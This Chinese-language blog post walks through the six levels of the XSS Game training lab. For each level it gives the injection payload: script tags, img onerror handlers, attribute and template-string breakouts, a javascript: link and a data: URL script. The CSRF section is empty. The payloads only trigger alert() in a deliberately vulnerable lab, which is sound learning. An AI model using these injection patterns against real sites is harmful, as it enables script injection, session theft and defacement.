---
title: Web安全系列：XSS和CSRF
mathjax: false
copyright: true
comment: true
date: 2019-11-18 16:33:05
tags:
- Security
categories:
- Security
photo: http://i-7.vcimg.com/trim/b68b1b513777815f0cf5b27e3568edae150489/trim.jpg
---

{% note primary %}
XSS、CSRF
{% endnote %}

<!-- more -->

---


## 前言

Web应用的安全问题也是一个web开发人员需要了解的事，今天我们就来看一看常见的两种安全问题，`XSS`和`CSRF`。


## XSS
> Cross-site scripting (XSS) bugs are one of the most common and dangerous types of vulnerabilities in Web applications.These nasty buggers can allow your enemies to steal or modify user data in your apps.


通过这个[小实验（游戏）](https://xss-game.appspot.com/)，你就可以大致了解一下XSS是一个什么东西了。

认识的一个大佬也写过一篇[XSS文章](https://orzbox.github.io/our-tech/#/articles/XSS-Explain-1)，可以当做参考。

做了一下这个实验，勉勉强强算是通关了。

在这个XSS Game中做了什么？**整体感觉就是从客户端找漏洞（看网页源码，JS、HTML），然后通过表单或者url注入脚本或者一些其他第三方脚本。**

> Cross-site scripting carried out on websites accounted for roughly 84% of all security vulnerabilities documented by Symantec up until 2007.（Wikipedia）

### 实验内容

大体记录一下实验内容吧。

#### level1

一个提交表单的页面，输入数据data并提交。
观察py代码可以看到他会将data渲染到页面内，那么我可以输入以下内容：

```javascript
【<script>alert(1)</script>】
```

OK，Hello World to XSS就完成了。


#### level2

一个发送评论的页面。
通过观察源码，发现他也会将输入的数据data直接显示出来。

但是这时候使用level1中的方法已经不管用了（可能是因为页面已经加载完了，无法执行script脚本

但是我可以通过如下代码来实现，插入一个无效图片，通过onerror方法来执行脚本。


```html
【<img src="" onerror="alert(1)"/>】
```

level2 is over！

#### level3

没有可输入的表单，但是可以通过URL输入，有个哈希参数用于图片显示。

通过观察源码，发现他将url输入的数字编号通过img标签进行拼接了（num就是我们输入的数）。

```javascript
【html += "<img src='/static/level3/cloud" + num + ".jpg' />";】
```

那我们可以通过如下代码来封闭标签：

```javascript

【https://xss-game.appspot.com/level3/frame#x' onerror='alert("xss")'>】

```

完成！

#### level4

一个输入表单数据timer，然后提交。

通过查看py代码，发现他的数据渲染部分（`{{}}`是模板）：

```html
【<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />】
```

我们利用封闭标签，输入如下代码：

```text
【');alert('xss】

模板渲染后：【onload="startTimer('');alert('xss');"】
```
这样就完成了。


#### level5

观察源码有一个a标签是通过模板渲染的:

```html
【<a href="{{ next }}">Next >></a>】
```

这里使用a标签的伪协议来完成，我们可以输入：

```html
【https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)】

模板渲染后：【<a href="javascript:alert(1)">Next >></a>】
```

#### level6

可以通过URL请求其他文件，可以通过data协议（`data:text/plain,alert('s')`）创建一个简单的文本。



结果：

```
【https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')】
```

## CSRF


## Reference

- [Warning: You are entering the XSS game area](https://xss-game.appspot.com/)
- [XSS跨站脚本攻击探讨总结](https://orzbox.github.io/our-tech/#/articles/XSS-Explain-1)
